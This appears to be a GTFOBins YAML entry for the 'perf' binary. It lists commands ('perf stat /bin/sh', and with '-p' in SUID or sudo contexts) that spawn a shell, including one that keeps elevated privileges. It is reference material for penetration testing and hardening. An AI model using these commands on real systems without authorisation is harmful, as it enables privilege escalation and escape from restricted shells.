<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/perf -->
---
functions:
  shell:
  - code: |-
      perf stat /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          perf stat /bin/sh -p
        shell: false
      unprivileged:
...
